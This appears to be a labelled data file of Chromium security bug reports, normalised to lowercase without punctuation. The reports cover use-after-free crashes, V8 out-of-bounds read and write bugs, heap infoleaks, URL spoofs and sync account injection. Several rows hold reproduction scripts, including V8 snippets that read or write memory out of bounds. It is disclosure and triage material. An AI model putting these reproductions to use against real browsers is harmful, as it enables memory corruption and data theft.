b\build\slave\win\build\src\base\message_loop\message_pump_win.cc 529 03a3f58c 52aaa0f1 chrome_52a80000 base messagepumpwin run c b\build\slave\win\build\src\base\message_loop\message_pump_win.h 48 03a3f5b0 52aaa049 chrome_52a80000 base messageloop runinternal c b\build\slave\win\build\src\base\message_loop\message_loop.cc 442 03a3f5c0 52aac011 chrome_52a80000 base runloop run c b\build\slave\win\build\src\base\run_loop.cc 46 03a3f5e8 52d5662a chrome_52a80000 base thread run c b\build\slave\win\build\src\base\threading\thread.cc 158 03a3f6b8 52d4eea6 chrome_52a80000 content browserthreadimpl iothreadrun c b\build\slave\win\build\src\content\browser\browser_thread_impl.cc 165 03a3f6cc 52aabed2 chrome_52a80000 content browserthreadimpl run c b\build\slave\win\build\src\content\browser\browser_thread_impl.cc 192 03a3f7f8 52aabc90 chrome_52a80000 base thread threadmain c b\build\slave\win\build\src\base\threading\thread.cc 207 error symbol file could not be found defaulted to export symbols for c windows\system32\kernel32.dll 03a3f80c 7705ed6c chrome_52a80000 base anonymous namespace threadfunc c b\build\slave\win\build\src\base\threading\platform_thread_win.cc 78 warning stack unwind information not available following frames may be wrong 03a3f818 76f337f5 kernel32 basethreadinitthunk 03a3f858 76f337c8 ntdll rtlinitializeexceptionchain 03a3f870 00000000 ntdll rtlinitializeexceptionchain regard khalil zhani	11
use-after-free in webcore timerbase stop vulnerability details the attached testcase crashes the latest asan build of chrome the issue seems to be timing depended however it crashes for me reliable after a few reloads i am using the following command line switches note gc has to be enabled no-sandbox incognito allow-file-access-from-files js-flags expose_gc version chrome version asan-symbolized-linux-release-217165 operating system linux 64bit reproduction case the testcase is attached as a zip file as it requires multiple files to reproduce for crashes please include the following additional information type of crash tab crash state see attached stack.txt for asan output 10th bug report o	11
assertion failed needslayout unknown in webcore rendersvgresourceclipper applyclippingtocontext detailed report fuzzer miaubiz_svg_fuzzer job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack webcore rendersvgresourcemasker applyresource webcore svgrenderingcontext preparetorendersvgcontent webcore rendersvgroot paintreplaced regressed minimized testcase 5.58 kb	11
heap-use-after-free in wtf equalnonnull vulnerability details at this stage it s almost 3am uk time i have n't done any analysis beyond what is obvious from the symbolized asan output the id of an html object element object2 in the testcase is freed before the element itself is freed this issue can be triggered in a few ways i went with clonenode as it iterates over all properties of an element the repro case is reliable but very picky about the order things are in i hope to add more detail soon version chrome version 31.0.1627.0 operating system xubuntu 13.04 reproduction case a minimized testcase is attached for ease of reproduction enable the use of window.gc in the js flags a full symbolized asan output is also attached	11
heap-use-after-free in webcore renderobject childat vulnerability details the following testcase crashes the chrome asan build version chrome version asan-symbolized-linux-release-223354 operating system linux 64-bit reproduction case html head script function start o2=document.createelement iframe document.getelementbyid store_div appendchild o2 o3=document.createelement iframe document.getelementbyid store_div appendchild o3 o5=document.createelement iframe document.getelementbyid store_div appendchild o5 o7=document.documentelement o12=document.getelementbyid fuzz_div o22=document.createelement form window.settimeout window.top.start_reload0 10 function start_reload0 o55=o2.contentwindow.document o76=document.createelement style document.head.appendchild o76 o142=o55.createrange o142.selectnodecontents o12 o12.appendchild o22 o12.contenteditable=true document.stylesheets 0 insertrule form after content beforeafter opacity 1 0 o250=o5.contentwindow.document o306=window.getselection o306.addrange o142 document.execcommand inserthtml false unescape iframe iframe o323=o3.contentwindow.document o7.addeventlistener domnoderemovedfromdocument cb_event_domnoderemovedfromdocument_207_1 true o550=o250.documentelement o697=o7.clonenode true o550.appendchild o697 o705=o250.documentelement o706=o323.documentelement o250.removechild o705 o250.appendchild o706 o323.appendchild o705 o697.style.csstext null o721=new mutationobserver cb_observer_319_1 o721.observe o697 childlist true attributes true subtree true attributeoldvalue true o55.open o12.innerhtml null function cb_event_domnoderemovedfromdocument_207_1 o55.location.reload o887=o250.documentelement o323.queryselector style style.csstext document.execcommand selectall false null function cb_observer_319_1 o887.appendchild o22 script head body onload start div id='store_div div div id='fuzz_div div body html for crashes please include the following additional information type of crash tab crash state see attached stack.txt for asan output	11
security show javascript prompt over interstitial page vulnerability details it is possible to show a javascript prompt over an interstitial page it can also be used as a url spoof since address bar shows the url of interstitial page while the prompt is owned by another domain version chrome version 29.0.1547.76 stable 31.0.1638.0 224348 trunk operating system ubuntu 12.04 reproduction case 1 download and host prompt.html on web server 2 open prompt.html on chrome 3 click visit ianfette link 4 a new window will open prompt will be displayed on new window 5 url of new window will change to ianfette.org and interstitial page is displayed for crashes please include the following additional information type of crash not a crash crash state see link above stack trace registers exception record client id if relevant see link above	11
http 1xx response handling code allows a website to read memory from the main process heap vulnerability description through carefully crafted http responses a malicious website is able to read information from the main chrome process vulnerability details the httpstreamparser class src\net\http\http_stream_parser.cc is used to send http requests and receive http responses its read_buf member is used to store http response data received from the server parts of the code are written under the assumption that the response currently being parsed is always stored at the start of this buffer read_buf startofbuffer other parts take into account that this may not be the case read_buf startofbuffer read_buf_unused_offset in most cases responses are removed from the buffer once they have been parsed and any superfluous data is moved to the beginning of the buffer to be treated as part of the next response however the code special cases http 1xx replies and returns a result without removing the request from the buffer this means that the response to the next request will not be stored at the start of the buffer but after the http 1xx response the code that special cases http 1xx responses is src\net\http\http_stream_parser.cc 580 if end_of_header_offset 1 snip 587 else 588 note where the headers stop 589 read_buf_unused_offset end_of_header_offset 590 591 if response headers response_code 100 1 592 after processing a 1xx response the caller will ask for the next 593 header so reset state to support that we do n't just skip these 594 completely because 1xx codes are n't acceptable when establishing a 595 tunnel 596 io_state state_request_sent 597 response_header_start_offset 1 the code above does not remove the http 1xx response from the buffer at this point 598 else the code that follows either removes the response from the buffer immediately or expects it to be removed in a call to readresponsebody later snip 619 return result 620 a look through the code has revealed one location where this can lead to a security issue also in doreadheaderscomplete the code uses an offset from the start of the buffer rather than the start of the current responses to pass as an argument to a doparseresponseheaders src\net\http\http_stream_parser.cc 540 if result err_connection_closed snip 554 parse things as well as we can and let the caller decide what to do 555 int end_offset 556 if response_header_start_offset 0 557 io_state state_read_body_complete 558 end_offset read_buf offset end_offset is relative to the start of the buffer read_buf startofbuffer 559 else 560 io_state state_body_pending 561 end_offset 0 end_offset is relative to the start of the current response read_buf startofbuffer read_buf_unused_offset 562 563 int rv doparseresponseheaders end_offset snip doparseresponseheaders passes the argument unchanged to httputil assemblerawheaders src\net\http\http_stream_parser.cc 782 int httpstreamparser doparseresponseheaders int end_offset 783 scoped_refptr httpresponseheaders headers 784 if response_header_start_offset 0 785 headers new httpresponseheaders httputil assemblerawheaders 786 read_buf startofbuffer read_buf_unused_offset end_offset snip httputil assemblerawheaders takes two arguments a pointer to a buffer and the length of the buffer the pointer is calculated correctly in doparseresponseheaders and points to the start of the current response the length is the offset that was calculated incorrectly in doreadheaderscomplete if the current response is preceded by a http 1xx response in the buffer this length is larger than it should be the calculated value will be the correct length plus the size of the previous http 1xx response read_buf_unused_offset src\net\http\http_util.cc 582 std string httputil assemblerawheaders const char input_begin 583 int input_len 584 std string raw_headers 585 raw_headers.reserve input_len 586 587 const char input_end input_begin input_len input_begin was calculated as read_buf startofbuffer read_buf_unused_offset input_len was incorrectly calculated as len headers read_buf_unused_offset so input_end will be read_buf startofbuffer 2 read_buf_unused_offset len headers which is beyond the end of the actual headers the code will continue to rely on this incorrect value to try to create a copy of the headers inadvertently makeing a copy of data that is not part of the response and may not even be part of the read_buf buffer this could cause the code to copy memory immediately following read_buf into a string that represents the response headers this string is passed to the process that made the request allowing a webpage inside the sandbox to read memory from the main process heap an ascii diagram might be useful to illustrate what is going on read_buf http 100 continue\r\n http xxx current response\r\n unused read_buf startofbuffer read_buf capacity read_buf offset read_buf_unused_offset doreadheaderscomplete/doparseresponseheaders end_offset assemblerawheaders input_begin input_len error in input_len value read_buf_unused_offset memory read from the main process heap version since the affected code has not been changed since 2009 i assume this affects all versions of chrome released in the last few years reproduction case attached is a simple proof-of-concept it consist of a server that hosts a simple webpage the webpage uses xmlhttprequest to make requests to the server the server responds with a carefully crafted reply to exploit the vulnerability the webpage then uses getallresponseheaders to read the memory copied from the main process heap and posts it to the server which displays the memory the poc makes no attempt to influence the layout of the main process memory so arbitrary data will be shown and access violation may occur with the poc loaded in one tab simply browsing the internet in another should put some interesting information on the heap that gets leaked tot the poc server impact the impact depends on what happens to be stored on the heap immediately following the buffer since a webpage can influence the activities of the main process eg it can ask it to make other http requests a certain amount of control over the heap layout is possible an attacker could attempt to create a heap feng shui like attack where careful manipulation of the main process activities allow reading of various types of information from the main process heap the attached poc does not attempt to do this the most obvious targets that come to mind are http request/response data for different domains and function pointers that can be used to bypass aslr/dep there are undoubtely many other forms of interesting information that can be revealed in this way there are little limits to the number of times an attacker can exploit this vulnerability if the buffer happens to be stored at the end of the heap attempts to exploit this vulnerability could trigger an access violation/segmentation fault when the code attempts to read beyond the buffer from unallocated memory addresses an attacker might be able to reduce this risk with heap feng shui like tricks as well fix i ve identified and tested two approaches to fixing this bug 1 fix the code where it relies on the response being stored at the start of the buffer attached is option 1.patch which fixes the code that causes this vulnerability as well as other parts of the code these other parts of the code do not immediately appear to cause security issues fixing them is a defense in depth 2 remove the http 1xx response from the buffer there is inline documentation in the source that explains why http 1xx responses are handled in a special way but it does n't make much sense to me afaict the code should remove the response from the buffer and switch to state_done to be on the safe side i ve included a patch that does remove the response but keeps the code that switches to state_request_sent in case there really is a good reason to do so added benfit of this fix is that it removes a potential dos attack where a server responds with many large http 1xx replies to exhaust memory in the main process related issues there are multiple locations in http_stream_parser.cc that are affected by this problem but none of them appear to cause serious issues patch 1 includes fixes for these as a precautionary measure the poc frequently triggers an unrelated null ptr in the renderer if you have the inspector open for which i ve filed issue 299880 attached poc.zip poc.py a poc server that serve a malicious webpage at proxy.html poc client side code used by poc.py option 1.patch fixes the issue by removing the assumption that responses are always located at the start of the buffer option 2.patch fixes the issue by removing http 1xx responses from the buffer	11
security jpeg info leak this page contains an alternating pattern of kitty.jpg a legit hello kitty image and 55.jpg an image that is decoded to what looks like uninitialized memory it may take a couple of reloads but you should eventually see one or more of the 55.jpg images decoding to a distorted hello kitty at the bare minimum this canvas seems like a way to steal images across domains although i suspect that the memory may contain non-image stuff too this also affects firefox safari etc by the looks of it	7
libjpeg_turbo huffval infoleak lcamtuf reported two infoleaks in issue 258723 one of them affecting libjpeg_turbo separating it into a new issue testcase turbo-dht.jpg is attached it is a use of uninitialized bytes from a stack buffer the stack buffer is in get_dht uint8 huffval 256 count 0 for i 1 i 16 i input_byte cinfo bits i return false count bits i for i 0 i count i input_byte cinfo huffval i return false memcopy htblptr huffval huffval sizeof htblptr huffval so this copies uninitialized stack memory into htblptr huffval later the uninitialized bytes are accessed here if the image contains large invalid huffman codes define huff_decode_fast s nb htbl s htbl pub huffval int s htbl valoffset nb here s can be large and the index to huffval can be arbitrary libjpeg is not affected because it has a check in jpeg_huff_decode if l 16 warnms state cinfo jwrn_huff_bad_code return 0 fake a zero as the safest result a fix for libjpeg_turbo could do the same or it could memset huffval to nuls	7
response splitting with 302 redirects allows chrome sync session fixation vulnerability details in the case of a 302-redirects chain oneclicksigninhelper incorrectly extracts url of possible google signin response and thus can be forced to trust google-chrome-signin/google-accounts-signin headers from any domain void oneclicksigninhelper showinfobarifpossible net urlrequest request profileiodata io_data int child_id int route_id std string google_chrome_signin_value std string google_accounts_signin_value request getresponseheaderbyname google-chrome-signin google_chrome_signin_value headers from the last response request getresponseheaderbyname google-accounts-signin google_accounts_signin_value if google_accounts_signin_value.empty google_chrome_signin_value.empty vlog 1 oneclicksigninhelper showinfobarifpossible g-a-s google_accounts_signin_value g-c-s google_chrome_signin_value if gaia isgaiasignonrealm request original_url getorigin but original_url is the first url in the 302 redirects chain return in order to exploit this up to session fixation you can take any web authorization/authentication protocol allowing 302 redirects for example google s oauth/openid since both oauth and openid are binded to accounts subdomain of google.com the first request to the endpoint along with service=chromiumsync in query will turn a new renderer into a trusted signin process then 302-directing chrome to attacker s domain the second response from a third party domain chrome_signin.php in repro will deliver the signin headers in turn redirecting browser to the final continue_url and starting the synchronization without a confirmation restrictions 1 you still need serviceloginauth csrf protection bypass xss on google.com or even social engineering is sufficient to submit any passwordform from accounts.google.com and to prefill a password for attacker s account 2 if current profile had already been synced with another account a confirmation dialog will be shown anyway version chrome version 30.0.1599.69 stable operating system windows 6.1 windows 7 windows server 2008 r2 reproduction case 1 in a new profile go to then emulate login csrf check bypass by typing in console document.cookie galx=abc path=/serviceloginauth domain=.google.com 2 open the attached chrome_signin.html wait for 1-2 seconds until a new google account is established then click on the signin link 3 chrome will start syncing with isciurus.test2 gmail.com patch looks like the patch should be straightforward to verify last url in the chain of redirects instead of the original url test=a standard auth flow from menu sign in to chrome should sign the user in successfully repro steps with chrome_signin.html/chrome_signin.php poc should not sign into chrome but redirect back to servicelogin instead best andrey labunets isciurus gmail.com	1
heap-use-after-free in webcore replaceselectioncommand doapply vulnerability details the following testcase crashes the chrome asan build the vulnerability is potentially exploitable as an attacker will be able to gain javascript execution between the free and the use of a node object the freed node object is allocated during the indent execcommand it is then freed during a call to execcommand forwarddelete in between both commands javascript code can be executed the vulnerable function replaceselectioncommand doapply keeps a pointer to the freed node through the local variable node startblock my guess would be that making startblock a refptr will fix the issue version chrome version asan-symbolized-linux-release-232589 operating system linux 64-bit reproduction case script function start o30=document.documentelement document.execcommand selectall false null o54=document.createelementns o54.onload=cb_dyniframes_39_1 o30.appendchild o54 function cb_dyniframes_39_1 document.designmode='on document.execcommand justifyfull false null document.execcommand insertimage false x.gif document.execcommand indent false null document.execcommand inserthtml false iframe iframe document.execcommand inserthtml false iframe src javascript window.top.cb_insertscript_107_1 iframe function cb_insertscript_107_1 document.execcommand justifyleft false null document.execcommand indent false null document.execcommand forwarddelete false null script body onload start body for crashes please include the following additional information type of crash tab crash state see attached stack.txt	11
url spoof vulnerability useragent mozilla/5.0 windows nt 6.2 wow64 applewebkit/537.36 khtml like gecko chrome/31.0.1650.57 safari/537.36 steps to reproduce the problem 1 simply open the poc click on the button 2 it will automaticly open the spoofed page 3 the spoofed page will get its real'/'expected url once the hidden print dialog on the parent page is closed what is the expected behavior what went wrong once the new tab is opened by window.open with a url and is then written by document.write it will still switch to the actual domain but if the parent page is blocked by any visual content like alert prompt confirm or print this will be blocked an attacker would use print because it does not block the user interaction on the opened spoofed page did this work before n/a chrome version 31.0.1650.57 channel stable os version 6.2 windows 8 flash version shockwave flash 11.9 r900 this vulnerability does not seem to work on the chromium release but does on the latest version of google chrome 31.0.1650.57	9
heap-use-after-free in webcore document updatehoveractivestate detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free read 4 crash address crash state crash stack webcore document updatehoveractivestate webcore document preparemouseevent free stack webcore node detach webcore containernode detach regressed minimized testcase 0.96 kb additional requirements requires interaction gestures	11
heap-use-after-free in webcore mediastreamaudiosourcenode process mediastreamaudiosourcenode has a raw pointer to audiosourceprovider audiosourceprovider can be deleted by javascript leading to a straightforward uaf reproduction script audio_context new webkitaudiocontext allocate audiosourceprovider dst_node audio_context.createmediastreamdestination stream dst_node.stream allocate audionode with a raw pointer to audiosourceprovider src_node audio_context.createmediastreamsource stream free audiosourceprovider track stream.getaudiotracks 0 stream.removetrack track track null gc use audiosourceprovider src_node.connect audio_context.destination script please expose gc to the repro chrome js-flags expose-gc webaudio.html	11
heap-use-after-free in base internal invoker 1 base internal bindstate base internal runnableadapter void detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack base internal invoker 1 base internal bindstate base internal runnableadapter void content webrtcidentityservice onidentityready free stack content webrtcidentityservice requestinfo requestinfo std deque content webrtcidentityservice requestinfo std allocator content webrtcidentityservic unreliable crash found using linux_tsan_chrome_mp job type history_size=5 additional requirements requires http	11
heap-buffer-overflow in v8 internal externalbytearray setvalue vulnerability details the code below writes to a freely choosable offset outside the allocated int8array any offset in range 0 see the last loop the underlying reason is an implicit size_t int31 sic signed thirty-one bit integer cast when creating a v8 internal externalarray which can overflow resulting in an apparent negative length of the external array s backing store which renders the existing bounds check in optimized code useless the suggested fix is to limit external array size to positive smi range i.e uint30 dmitry is working on this version latest v8 is definitely affected so is m30 and most likely everything in between as far as i can tell only 32bit platforms are affected ia32 arm reproduction case var training new int8array 10 var a new int8array var index new int32array 1 function write x x index 0 trigger optimization of write index 0 0 for var i 0 i 10000 i write training write out of bounds until segfault for var i 0 i i index 0 i write a	11
security integer overflow leading to exploitable buffer overflow on 32-bit when parsing encrypted mp4 parsing cenc headers of an mp4 media/mp4/cenc.cc bool framecencinfo parse int iv_size bufferreader reader uint16 subsample_count rcheck reader read2 subsample_count reader hasbytes subsample_count kentrysize read number of samples subsamples.resize subsample_count for int i 0 i subsample_count i uint16 clear_bytes uint32 cypher_bytes rcheck reader read2 clear_bytes reader read4 cypher_bytes cypher_bytes is arbitrary 32 bit int subsamples i clear_bytes clear_bytes subsamples i cypher_bytes cypher_bytes cypher_bytes and clear_bytes are later on validated but the validation lacks integer overflow checks there is another similar check prior to this which calls gettotalsizeofsubsamples which also lacks overflow checks but it will fail on 64-bit due to use of size_t media/cdm/aes_decryptor.cc int total_clear_size 0 int total_encrypted_size 0 for size_t i 0 i subsamples.size i total_clear_size subsamples i clear_bytes total_encrypted_size subsamples i cypher_bytes overflow if total_clear_size total_encrypted_size sample_size dvlog 1 subsample sizes do not equal input size return null later on these values are used as allocation sizes scoped_ptr uint8 encrypted_bytes new uint8 total_encrypted_size overflowed size copysubsamples subsamples ksrccontainsclearbytes reinterpret_cast const uint8 sample encrypted_bytes.get copysubsamples copies in chunks static void copysubsamples const std vector subsampleentry subsamples const clearbytesbuffersel sel const uint8 src uint8 dst for size_t i 0 i subsamples.size i const subsampleentry subsample subsamples i if sel ksrccontainsclearbytes src subsample.clear_bytes else dst subsample.clear_bytes memcpy dst src subsample.cypher_bytes src subsample.cypher_bytes dst subsample.cypher_bytes with some heap grooming you could limit the copy by overflowing into the backing storage of subsampleentries rendering this actually exploitable vector partition is m32 not stable yet i do not know the status of this feature it certainly impacts stable with eme enabled is this enabled by default anywhere chromeos or prefixed setting up a server for this proved a bit tricky but i ve confirmed the crash by attached a debugger to oops_cenc and just editing the header in memory when it s being parsed totally legit i can spend a bit more time setting something up if necessary but the fix looks simple cc ing a few people who ve touched that code but assigned to myself for the fix	11
oob read in v8 vulnerability details the code below reads at a user-controlled offset outside before the allocated array the bug is easiest to trigger with typed arrays but also affects regular javascript arrays the reason is that v8 s hloadkeyed instruction uses a 25 bit wide field to store index_offset but the hdehoistindexcomputationsphase that populates this field allows up to 30 bit values which are implicitly and silently truncated the obvious fix is to disallow dehoisting of offsets that need more than 25 bits version tested m30 and m32 both are affected so is the latest v8 this bug affects all architectures and operating systems reproduction case function println x if console console.log return console.log x print x defined in d8 function read a index var offset can be any value 1 25 var result for var i 0 i 1 i result a index offset return result try catch e disable optimization of the top level var a new int8array trigger optimization of read for var i 0 i 100000 i read a 0 now read out of bounds until segfault for var i 0 i i print read a i for crashes please include the following additional information sample crash report	11
heap-use-after-free in webcore renderblock determinestartposition detailed report fuzzer inferno_twister job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderblock determinestartposition webcore renderblock layoutrunsandfloats free stack webcore node detach webcore containernode detach minimized testcase 0.95 kb	11
use-after-free in v8 handlescope handlescope detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free read 4 crash address crash state crash stack v8 handlescope handlescope webcore v8abstracteventlistener v8abstracteventlistener free stack v8 internal v8 teardown content childprocess childprocess	11
security prerendered pages can add incorrect alias urls and intercept future navigations to them this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details prerender adds navigations as alias urls before they commit which means they may be canceled and remain aliases on the page this would then swap in the next load on that url in that tab until the prerender times out prerenders are currently scoped to the tab they re launched from version chrome version 30.0.1599.114 stable should be all versions operating system all with prerender reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug 1 serve this file on a local http server title definitely google.com title h1 hey there this page is definitely google.com h1 script could probably do this for lots of urls if you feel like it settimeout function location.href settimeout function window.stop 10 500 script 2 enter the url into prerender-test to get it to prerender or arrange for it to be the first hit on a search query or host some page yourself that triggers the prerender 3 enter google.com in your address bar the prerendered page gets swapped in instead of the real google.com dunno how severe this counts as the url bar reflects this so that part s not spoofed but you probably should n't be able to hijack those navigations the fix should be pretty easy add alias urls in didnavigatemainframe conveniently framenavigateparams includes the redirect chain rather than in response to redirects and provisional loads	11
tracking bug for internal security fixes for chrome 31 release 1 high medium	11
oob write in v8 only 64bit vulnerability details the code below writes to a choosable offset outside before the previously allocated float64array any offset in the range 0 can be chosen see the last loop the underlying reason is that the bounds check operates on the field index and properly takes the offset into account but the memory address of the actual store instruction uses offset element_shift_size as immediate offset without checking for overflow i think limiting the maximum offset for dehoisted indices should fix this i ll look into it version latest v8 is definitely affected so is m32 i have n't checked yet but i think older versions at least m30 m31 are affected too this bug only manifests on 64bit architectures on 32bit the same overflow happens but is unobservable because addresses wrap around at 4gb anyway so writes still go to the correct address even after overflow reproduction case var writable_address_range var a new float64array writable_address_range var training new float64array 10 function write a index var offset for var i 0 i 1 i a index offset trigger optimization of write for var i 0 i 1000 i write training write training 1 now write out of bounds until segfault the initialization value for i can be freely chosen within writable_address_range an interesting value is 2 which does not segfault on access but corrupts the c heap because it overwrites the float64array s backing store for var i i writable_address_range i write a i for crashes please include the following additional information sample crash id with bogus stack trace	11
use-after-free in v8 internal globalhandles destroy detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free write 1 crash address crash state crash stack v8 internal globalhandles destroy webcore v8storageerrorcallback v8storageerrorcallback free stack v8 internal globalhandles globalhandles v8 internal isolate isolate	11
heap-buffer-overflow in v8 internal externalbytearray setvalue vulnerability details the code below writes to a freely choosable offset outside the allocated int8array any offset in range 0 see the last loop the underlying reason is an implicit size_t int31 sic signed thirty-one bit integer cast when creating a v8 internal externalarray which can overflow resulting in an apparent negative length of the external array s backing store which renders the existing bounds check in optimized code useless the suggested fix is to limit external array size to positive smi range i.e uint30 dmitry is working on this version latest v8 is definitely affected so is m30 and most likely everything in between as far as i can tell only 32bit platforms are affected ia32 arm reproduction case var training new int8array 10 var a new int8array var index new int32array 1 function write x x index 0 trigger optimization of write index 0 0 for var i 0 i 10000 i write training write out of bounds until segfault for var i 0 i i index 0 i write a	11
heap-use-after-free in webcore formassociatedelement formremovedfromtree tested on os ubuntu 12.04 chromium asan 33.0.1732.0 developer build 239266 repro-file html body div id submenu table form id cse-search-box td align right input name q script type text/javascript var test0=document.getelementbyid cse-search-box var test1=document.getelementbyid submenu test0 q test1.innerhtml settimeout function test1.insertbefore test0 50 settimeout function location.reload 1000 script asan-report 13809==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 chrome 0 in webcore formassociatedelement setform webcore htmlformelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/formassociatedelement.cpp:136:0 1 in webcore htmlformelement removedfrom webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:145:0 2 in webcore childnoderemovalnotifier notifynoderemovedfromdocument webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:237:0 3 in webcore childnoderemovalnotifier notify webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:255:0 4 in webcore private noderemovaldispatcher webcore node webcore containernode true dispatch webcore node webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:141:0 5 in void webcore private addchildnodestodeletionqueue webcore node webcore containernode webcore node webcore node webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:184:0 freed by thread t0 chrome here 0 in interceptor_free asan_rtl_:0 1 in derefifnotnull webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/passrefptr.h:56:0 2 in refptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:49:0 3 in refptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:49:0 4 in wtf refptr webcore node operator webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:113:0 5 in webcore htmlformelement removefrompastnamesmap webcore htmlelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:759:0 6 in webcore htmlformelement removeformelement webcore formassociatedelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:604:0 7 in webcore formassociatedelement setform webcore htmlformelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/formassociatedelement.cpp:135:0 8 in webcore htmlformelement removedfrom webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmlformelement.cpp:145:0 if this issue is not a duplicate i ll try to analyze it little further tomorrow	11
security inserting a google account to chrome and stealing user s private data vulnerability details an attacker can send a malicious url to a victim and insert his account to her google chrome to sync the victim s private data history passwords etc without the victim s knowledge version chrome version 31.0.1650.57 stable operating system mac os x 10.8.5 reproduction case i attached a simple poc in php change the email and password vars any google email and password under your control and if needed change the millisecondstoreplacewindow sometimes the poc does not work in the first time because some google accounts will ask you to add the account to chrome direct from the web ui in that cases you need click on skip for now and reproduce the poc again change the millisecondstoreplacewindow to 60000 click on start the hack and click on skip for now after change the millisecondstoreplacewindow to the original value sign out of the account in the chrome settings and try again this poc was tested in chrome instances without other accounts linked please create a new user if you already have an account linked to your chrome just disconnect your account will not solve the problem and the poc may not work fix you need ask the chrome users if they really want to add an google account to their chrome before actually add the account with an dialog that attackers can not control or close	1
heap-use-after-free in webcore document updatelayout detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free write 1 crash address crash state crash stack webcore document updatelayout webcore document updatelayoutignorependingstylesheets free stack webcore renderwidget updatesuspendscope updatesuspendscope webcore containernode removechildren regressed minimized testcase 1.01 kb	11
heap-use-after-free in webcore svgpropertytearoff webcore svgmatrix detachwrapper detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free read 48 crash address crash state crash stack webcore svgpropertytearoff webcore svgmatrix detachwrapper webcore svgpropertytearoff webcore svgtransform detachwrapper free stack webcore svglistproperty webcore svgtransformlist insertitembeforevaluesandwrappers webcore svglistpropertytearoff webcore svgtransformlist insertitembefore regressed minimized testcase 2.51 kb	11
assertion failed node node hastagname htmlnames tdtag node hastagname htmlnames thtag unknown in webcore accessibilitytable isdatatable detailed report uploader inferno chromium.org job type linux_asan_content_shell_bad_cast crash type unknown crash address crash state crash stack webcore htmlelement iscfhtmltablecellelement webcore accessibilitytable isdatatable webcore accessibilitytable istableexposablethroughaccessibility minimized testcase 0.74 kb download style c3 nth-child even display table-cell style script var nodes array function boom try nodes 1 document.createelement table catch e try document.documentelement.appendchild nodes 1 catch e try nodes 3 document.createelement b catch e try nodes 1 appendchild nodes 3 catch e try nodes 21 document.createelement blockquote catch e try nodes 21 setattribute class c3 catch e try nodes 1 appendchild nodes 21 catch e try nodes 48 document.createelement keygen catch e try nodes 48 setattribute autofocus autofocus catch e try nodes 21 appendchild nodes 48 catch e window.onload boom script	11
heap-use-after-free in content webrtcidentityservicehost onrequestidentity detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack content webrtcidentityservicehost onrequestidentity content webrtcidentityservicehost onmessagereceived free stack content storagepartitionimpl storagepartitionimpl content storagepartitionimpl storagepartitionimpl unreliable crash found using linux_tsan_chrome_mp job type history_size=5 additional requirements requires http	11
use-after-free from svgmatrixtearoff folked from what steps will reproduce the problem loading below html to asan content_shell will cause read-after-free html head script src resources/js-test.js script script if window.testrunner testrunner.dumpastext function go var svg document.createelementns svg var rect document.createelementns rect rect.transform.baseval.appenditem svg.createsvgtransform var matrix rect.transform.baseval.getitem 0 matrix rect null gc console.log matrix.a script head body onload go this test passes if it does n't crash body html what is the expected output what do you see instead no use-after-free	11
assertion failed m_deletionhasbegun unknown in webcore formassociatedelement formremovedfromtree detailed report fuzzer cris_happyfuntime job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack webcore formassociatedelement formremovedfromtree webcore htmlformelement removedfrom void webcore private addchildnodestodeletionqueue webcore node webcore containernode regressed minimized testcase 0.31 kb	11
heap-use-after-free in webcore renderblockflow determinestartposition detailed report fuzzer j00ru_htmlcss_fuzz job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderblockflow determinestartposition webcore renderblockflow layoutrunsandfloats free stack webcore node detach webcore containernode removechild regressed minimized testcase 1.31 kb	11
security popups opened in fullscreen mode are opened as popunders vulnerability details while a web site is in fullscreen mode all popups it opens using e.g window.open are turned into popunders i.e even after the web site leaves fullscreen mode they will be behind the site since request fullscreen does n't consume a user gesture a site can enter fullscreen open a popup now a popunder and leave fullscreen in its click-handler i think requestfullscreen should consume the user gesture and if a site opens a popup while in fullscreen mode we should automatically leave fullscreen mode before opening the popup version chrome version 30 operating system all	11
heap-buffer-overflow in util to_uint16_t detailed report fuzzer jorgelo_qo_doc_reliability job type qo_dcp_test crash type heap-buffer-overflow read 1 crash address crash state crash stack util to_uint16_t office doc xst init office doc lvl init minimized testcase 1708.50 kb	11
